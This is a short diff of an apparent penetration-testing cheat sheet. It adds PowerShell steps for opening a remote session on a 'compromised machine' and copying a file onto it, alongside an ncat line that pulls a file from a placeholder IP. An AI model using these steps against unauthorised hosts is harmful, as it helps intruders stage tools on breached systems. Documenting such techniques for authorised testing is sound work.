@@ -62,5 +62,10 @@ ncat <IP> <PORT> --recv-only > <FILE>
 
 #### 1) Create Remote Session on Compromised machine
 ```powershell
-$Session = new-PSSession -
+$Session = new-PSSession -ComputerName <COMPUTERNAME>
+```
+
+#### 2) Copy file from localhost to remote session
+```powershell
+Copy-Item -Path <PATH TO FILE> -ToSession $Session 
 ```
